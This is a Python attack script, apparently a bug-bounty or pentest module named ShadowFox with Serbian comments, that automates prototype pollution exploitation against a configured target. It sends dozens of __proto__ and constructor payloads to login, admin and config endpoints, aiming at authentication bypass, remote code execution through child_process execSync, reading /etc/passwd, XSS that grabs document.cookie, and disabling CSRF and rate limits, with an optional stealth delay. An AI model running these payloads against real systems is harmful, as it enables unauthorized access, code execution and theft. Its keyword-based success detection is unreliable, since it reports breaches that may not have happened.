## 🧬 **SHADOWFOX PROTOTYPE POLLUTION ADVANCED EXPLOITATION**

#!/usr/bin/env python3
"""
🧬 SHADOWFOX PROTOTYPE POLLUTION ADVANCED EXPLOITATION
Duboki modul za eksploataciju Prototype Pollution ranjivosti
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import hashlib
import base64
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class PrototypePollutionExploit:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.target_url = ""
        self.exploitation_results = {
            "mission_info": {},
            "prototype_pollution_tests": [],
            "successful_exploits": [],
            "privilege_escalation": [],
            "rce_attempts": [],
            "bypass_attempts": [],
            "client_side_injection": [],
            "statistics": {}
        }
        
    def load_meta_config(self):
        """Učitava Meta konfiguraciju"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.target_url = self.meta_config.get('target_root', '')
                self.exploitation_results["mission_info"] = self.meta_config
                print(f"🎯 [META] Target: {self.target_url}")
        except FileNotFoundError:
            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
            exit(1)
            
    def setup_session(self):
        """Podešavanje sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        self.session.verify = False
        self.session.timeout = 15
        
    def generate_prototype_payloads(self):
        """Generiše napredne Prototype Pollution payloade"""
        
        # 1. AUTHENTICATION BYPASS PAYLOADS
        auth_bypass_payloads = [
            # Osnovni admin bypass
            {"__proto__": {"admin": True}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"privileged": True}},
            {"__proto__": {"authorized": True}},
            {"__proto__": {"superuser": True}},
            {"__proto__": {"root": True}},
            
            # Role-based bypass
            {"__proto__": {"roles": ["admin", "superuser"]}},
            {"__proto__": {"permissions": ["read", "write", "delete"]}},
            {"__proto__": {"access_level": 999}},
            {"__proto__": {"user_type": "admin"}},
            {"__proto__": {"account_type": "premium"}},
            
            # JWT/Token bypass
            {"__proto__": {"jwt": {"admin": True}}},
            {"__proto__": {"token": {"role": "admin"}}},
            {"__proto__": {"session": {"privileged": True}}},
            {"__proto__": {"auth": {"bypass": True}}},
            
            # Nested object pollution
            {"__proto__": {"user": {"admin": True, "role": "superuser"}}},
            {"__proto__": {"config": {"admin_panel": True}}},
            {"__proto__": {"settings": {"debug": True, "admin": True}}}
        ]
        
        # 2. REMOTE CODE EXECUTION PAYLOADS
        rce_payloads = [
            # Template injection kroz prototype
            {"__proto__": {"template": "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"}},
            {"__proto__": {"view": "{{constructor.constructor('return process')().env}}"}},
            {"__proto__": {"render": "{{constructor.constructor('return global.process.mainModule.require')('child_process').execSync('whoami')}}"}},
            
            # Constructor pollution
            {"constructor": {"prototype": {"admin": True}}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            
            # Eval injection
            {"__proto__": {"eval": "require('child_process').exec('id', function(err, stdout, stderr) { console.log(stdout); })"}},
            {"__proto__": {"code": "process.exit(0)"}},
            
            # File system access
            {"__proto__": {"fs": "require('fs').readFileSync('/etc/passwd', 'utf8')"}},
            {"__proto__": {"file": "/etc/passwd"}},
            {"__proto__": {"path": "../../../etc/passwd"}},
            
            # Process manipulation
            {"__proto__": {"env": {"NODE_ENV": "development"}}},
            {"__proto__": {"process": {"env": {"DEBUG": "1"}}}}
        ]
        
        # 3. CLIENT-SIDE TEMPLATE INJECTION
        client_side_payloads = [
            # AngularJS injection
            {"__proto__": {"template": "{{constructor.constructor('alert(1)')()}}"}},
            {"__proto__": {"ng-template": "{{constructor.constructor('alert(document.domain)')()}}"}},
            
            # Vue.js injection
            {"__proto__": {"template": "{{constructor.constructor('alert(1)')()}}"}},
            {"__proto__": {"render": "function(){return this.constructor.constructor('alert(1)')()}"}},
            
            # React injection
            {"__proto__": {"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}}},
            
            # Handlebars injection
            {"__proto__": {"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}"}},
            
            # Generic XSS
            {"__proto__": {"innerHTML": "<script>alert('Prototype Pollution XSS')</script>"}},
            {"__proto__": {"outerHTML": "<img src=x onerror=alert(document.cookie)>"}},
            {"__proto__": {"src": "javascript:alert(1)"}},
            {"__proto__": {"href": "javascript:alert(1)"}}
        ]
        
        # 4. CONFIGURATION BYPASS PAYLOADS
        config_bypass_payloads = [
            # Debug mode activation
            {"__proto__": {"debug": True}},
            {"__proto__": {"DEBUG": True}},
            {"__proto__": {"development": True}},
            {"__proto__": {"NODE_ENV": "development"}},
            
            # Security bypasses
            {"__proto__": {"csrf": False}},
            {"__proto__": {"csrf_protection": False}},
            {"__proto__": {"validate_csrf": False}},
            {"__proto__": {"security": False}},
            {"__proto__": {"authentication": False}},
            {"__proto__": {"authorization": False}},
            
            # Rate limiting bypass
            {"__proto__": {"rateLimit": False}},
            {"__proto__": {"rate_limit": False}},
            {"__proto__": {"throttle": False}},
            
            # CORS bypass
            {"__proto__": {"cors": "*"}},
            {"__proto__": {"allowOrigin": "*"}},
            {"__proto__": {"Access-Control-Allow-Origin": "*"}}
        ]
        
        # 5. DEEP MERGE POLLUTION
        deep_merge_payloads = [
            # Nested pollution
            {"__proto__": {"__proto__": {"admin": True}}},
            {"constructor": {"prototype": {"constructor": {"prototype": {"admin": True}}}}},
            
            # Array prototype pollution
            {"__proto__": {"length": 0}},
            {"__proto__": {"push": "function(){return 'polluted'}"}},
            {"__proto__": {"toString": "function(){return 'polluted'}"}},
            
            # Object prototype pollution  
            {"__proto__": {"valueOf": "function(){return true}"}},
            {"__proto__": {"hasOwnProperty": "function(){return true}"}},
            {"__proto__": {"isPrototypeOf": "function(){return true}"}}
        ]
        
        return {
            "auth_bypass": auth_bypass_payloads,
            "rce": rce_payloads,
            "client_side": client_side_payloads,
            "config_bypass": config_bypass_payloads,
            "deep_merge": deep_merge_payloads
        }
        
    def test_prototype_pollution(self, endpoint, payload_category, payload, method="POST"):
        """Testira jedan Prototype Pollution payload"""
        
        attack_id = hashlib.md5(f"{endpoint}{payload_category}{str(payload)}".encode()).hexdigest()[:8]
        
        print(f"🧬 [PP TEST] {attack_id}: {payload_category} | {method} {endpoint}")
        
        try:
            # Headers za JSON payload
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
            
            # Delay za stealth
            if self.meta_config.get('stealth_mode', False):
                time.sleep(self.meta_config.get('rate_delay_seconds', 2.5))
                
            # Pošaljemo payload
            if method.upper() == "POST":
                response = self.session.post(endpoint, json=payload, headers=headers)
            elif method.upper() == "PUT":
                response = self.session.put(endpoint, json=payload, headers=headers)
            else:
                response = self.session.get(endpoint, params=payload)
                
            # Analiza response-a
            result = self.analyze_pp_response(attack_id, endpoint, payload_category, payload, response)
            
            return result
            
        except Exception as e:
            error_result = {
                "attack_id": attack_id,
                "status": "FAILED",
                "error": str(e),
                "endpoint": endpoint,
                "payload_category": payload_category,
                "payload": payload,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            print(f"❌ [PP ERROR] {attack_id}: {str(e)}")
            return error_result
            
    def analyze_pp_response(self, attack_id, endpoint, payload_category, payload, response):
        """Analiza response-a za Prototype Pollution indikatore"""
        
        result = {
            "attack_id": attack_id,
            "status": "COMPLETED",
            "endpoint": endpoint,
            "payload_category": payload_category,
            "payload": payload,
            "response_analysis": {
                "status_code": response.status_code,
                "content_length": len(response.content),
                "headers": dict(response.headers),
                "response_time": 0
            },
            "pollution_indicators": [],
            "severity": "INFO",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        response_text = response.text.lower()
        
        # 1. SUCCESS INDICATORS
        success_indicators = [
            "admin", "administrator", "root", "superuser",
            "privileged", "authorized", "authenticated",
            "dashboard", "admin panel", "control panel",
            "user management", "system settings"
        ]
        
        for indicator in success_indicators:
            if indicator in response_text:
                pollution_indicator = {
                    "type": "SUCCESS_INDICATOR",
                    "description": f"Response contains '{indicator}' - possible successful pollution",
                    "severity": "HIGH"
                }
                result["pollution_indicators"].append(pollution_indicator)
                result["severity"] = "HIGH"
                
        # 2. AUTHENTICATION BYPASS INDICATORS
        auth_bypass_indicators = [
            "welcome admin", "admin logged in", "role: admin",
            "access granted", "authentication successful",
            "login successful", "session created"
        ]
        
        for indicator in auth_bypass_indicators:
            if indicator in response_text:
                bypass_indicator = {
                    "type": "AUTH_BYPASS",
                    "description": f"Possible authentication bypass: '{indicator}'",
                    "severity": "CRITICAL"
                }
                result["pollution_indicators"].append(bypass_indicator)
                result["severity"] = "CRITICAL"
                self.exploitation_results["bypass_attempts"].append(result)
                
        # 3. PRIVILEGE ESCALATION INDICATORS
        privilege_indicators = [
            "admin privileges", "elevated access", "superuser access",
            "root privileges", "administrative rights"
        ]
        
        for indicator in privilege_indicators:
            if indicator in response_text:
                privilege_indicator = {
                    "type": "PRIVILEGE_ESCALATION",
                    "description": f"Possible privilege escalation: '{indicator}'",
                    "severity": "CRITICAL"
                }
                result["pollution_indicators"].append(privilege_indicator)
                result["severity"] = "CRITICAL"
                self.exploitation_results["privilege_escalation"].append(result)
                
        # 4. RCE INDICATORS (za RCE payloade)
        if payload_category == "rce":
            rce_indicators = [
                "uid=", "gid=", "root", "bin/sh", "/etc/passwd",
                "command executed", "process", "child_process"
            ]
            
            for indicator in rce_indicators:
                if indicator in response_text:
                    rce_indicator = {
                        "type": "RCE_INDICATOR",
                        "description": f"Possible RCE: '{indicator}' found in response",
                        "severity": "CRITICAL"
                    }
                    result["pollution_indicators"].append(rce_indicator)
                    result["severity"] = "CRITICAL"
                    self.exploitation_results["rce_attempts"].append(result)
                    
        # 5. CLIENT-SIDE INJECTION INDICATORS
        if payload_category == "client_side":
            xss_indicators = [
                "<script>", "javascript:", "onerror=", "onload=",
                "alert(", "document.cookie", "document.domain"
            ]
            
            for indicator in xss_indicators:
                if indicator in response_text:
                    xss_indicator = {
                        "type": "CLIENT_SIDE_INJECTION",
                        "description": f"Possible client-side injection: '{indicator}'",
                        "severity": "HIGH"
                    }
                    result["pollution_indicators"].append(xss_indicator)
                    result["severity"] = "HIGH"
                    self.exploitation_results["client_side_injection"].append(result)
                    
        # 6. ERROR DISCLOSURE ANALYSIS
        error_patterns = [
            "prototype", "constructor", "__proto__", "pollution",
            "invalid property", "cannot set property",
            "syntaxerror", "referenceerror", "typeerror"
        ]
        
        for pattern in error_patterns:
            if pattern in response_text:
                error_indicator = {
                    "type": "ERROR_DISCLOSURE",
                    "description": f"Prototype pollution error revealed: '{pattern}'",
                    "severity": "MEDIUM"
                }
                result["pollution_indicators"].append(error_indicator)
                if result["severity"] == "INFO":
                    result["severity"] = "MEDIUM"
                    
        # 7. STATUS CODE ANALYSIS
        if response.status_code == 200:
            if len(response.text) > 1000:  # Significant response
                success_indicator = {
                    "type": "SUCCESSFUL_RESPONSE",
                    "description": "200 OK with substantial content - payload may have been processed",
                    "severity": "MEDIUM"
                }
                result["pollution_indicators"].append(success_indicator)
                
        elif response.status_code == 302:
            redirect_indicator = {
                "type": "REDIRECT",
                "description": "302 Redirect - possible successful authentication/authorization",
                "severity": "HIGH"
            }
            result["pollution_indicators"].append(redirect_indicator)
            result["severity"] = "HIGH"
            
        # Dodaj u odgovarajuću listu
        if result["severity"] in ["HIGH", "CRITICAL"]:
            self.exploitation_results["successful_exploits"].append(result)
            
        self.exploitation_results["prototype_pollution_tests"].append(result)
        
        return result
        
    def run_comprehensive_pp_test(self):
        """Pokreće sveobuhvatan Prototype Pollution test"""
        
        print("🧬 SHADOWFOX PROTOTYPE POLLUTION - COMPREHENSIVE TEST")
        print("=" * 70)
        
        # Generiši sve payloade
        payloads = self.generate_prototype_payloads()
        
        # Endpoints za testiranje
        endpoints = [
            f"{self.target_url}/login",
            f"{self.target_url}/api/login",
            f"{self.target_url}/auth/login",
            f"{self.target_url}/signin",
            f"{self.target_url}/api/auth",
            f"{self.target_url}/api/user",
            f"{self.target_url}/user/profile",
            f"{self.target_url}/admin",
            f"{self.target_url}/api/admin",
            f"{self.target_url}/config",
            f"{self.target_url}/settings"
        ]
        
        total_tests = 0
        
        # Testiraj sve kombinacije
        for category, payload_list in payloads.items():
            print(f"\n🎯 [TESTING] {category.upper()} - {len(payload_list)} payloads")
            
            for payload in payload_list:
                for endpoint in endpoints:
                    # Test POST
                    result = self.test_prototype_pollution(endpoint, category, payload, "POST")
                    total_tests += 1
                    
                    # Ako je kritičan nalaz, testiraj i druge metode
                    if result.get("severity") == "CRITICAL":
                        print(f"🔥 [CRITICAL] Testiranje dodatnih metoda za {endpoint}")
                        self.test_prototype_pollution(endpoint, category, payload, "PUT")
                        self.test_prototype_pollution(endpoint, category, payload, "GET")
                        total_tests += 2
                        
        # Generiši statistiku
        stats = {
            "total_tests": total_tests,
            "successful_exploits": len(self.exploitation_results["successful_exploits"]),
            "privilege_escalations": len(self.exploitation_results["privilege_escalation"]),
            "auth_bypasses": len(self.exploitation_results["bypass_attempts"]),
            "rce_attempts": len(self.exploitation_results["rce_attempts"]),
            "client_side_injections": len(self.exploitation_results["client_side_injection"]),
            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.exploitation_results["statistics"] = stats
        
    def save_results(self):
        """Snimanje rezultata"""
        output_file = "AdvanceNapad/prototype_pollution_results.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.exploitation_results, f, indent=2, ensure_ascii=False)
            print(f"\n💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka"""
        stats = self.exploitation_results["statistics"]
        print("\n🧬 PROTOTYPE POLLUTION - SAŽETAK")
        print("=" * 50)
        print(f"🧪 Ukupno testova: {stats['total_tests']}")
        print(f"🔥 Uspešni exploiti: {stats['successful_exploits']}")
        print(f"🚀 Privilege escalation: {stats['privilege_escalations']}")
        print(f"🔓 Auth bypass: {stats['auth_bypasses']}")
        print(f"💥 RCE pokušaji: {stats['rce_attempts']}")
        print(f"🕷️ Client-side injection: {stats['client_side_injections']}")
        
        # Prikaz kritičnih nalaza
        if self.exploitation_results["successful_exploits"]:
            print(f"\n🎯 KRITIČNI NALAZI:")
            for exploit in self.exploitation_results["successful_exploits"][:5]:
                print(f"   • {exploit['attack_id']}: {exploit['payload_category']} - {exploit['severity']}")
                
        print(f"\n✅ Detaljan izveštaj: AdvanceNapad/prototype_pollution_results.json")
        
    def run(self):
        """Glavna funkcija"""
        print("🦊 SHADOWFOX PROTOTYPE POLLUTION EXPLOITATION")
        
        self.load_meta_config()
        self.setup_session()
        self.run_comprehensive_pp_test()
        self.save_results()
        self.display_summary()

def main():
    pp_exploit = PrototypePollutionExploit()
    pp_exploit.run()

if __name__ == "__main__":
    main()

